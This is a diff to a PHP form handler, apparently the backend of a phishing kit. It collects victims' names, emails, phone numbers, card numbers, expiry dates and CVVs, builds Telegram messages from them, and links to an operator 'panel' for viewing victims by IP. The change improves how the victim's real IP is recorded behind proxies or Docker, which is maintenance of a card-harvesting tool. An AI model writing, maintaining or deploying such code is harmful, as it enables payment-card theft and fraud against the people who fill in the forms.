@@ -12,7 +12,8 @@ $ids = explode(",",str_replace(" ","",$a_ids));
 
 $panel = str_replace('msdpweb/send.php', '' , "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."/panel/view.php?vip=$ip");
 
-$ip = $_SERVER['REMOTE_ADDR'];
+// Get real IP (handles proxies/Docker)
+$ip = getRealClientIP();
 
 function post($data){
 	if(!isset($_POST[$data]) || empty(trim($_POST[$data]))){
@@ -44,8 +45,8 @@ if(isset($_POST['fname'])){
     $email = isset($_POST['email']) ? $_POST['email'] : '';
     $number = isset($_POST['number']) ? $_POST['number'] : '';
     
-    // Get IP address
-    $ip = $_SERVER['REMOTE_ADDR']; // or your custom IP detection method
+    // Get real IP (handles proxies/Docker)
+    $ip = getRealClientIP();
     
     // Create Telegram message content
     $telegram_content = urlencode("
@@ -87,8 +88,8 @@ if(isset($_POST['cc'])){
     $date = isset($_POST['exp']) ? $_POST['exp'] : '';
     $code = isset($_POST['cvv']) ? $_POST['cvv'] : '';
     
-    // Get IP address
-    $ip = $_SERVER['REMOTE_ADDR']; // or your custom IP detection method
+    // Get real IP (handles proxies/Docker)
+    $ip = getRealClientIP();
     
     // Create Telegram message content
     $telegram_content = urlencode("
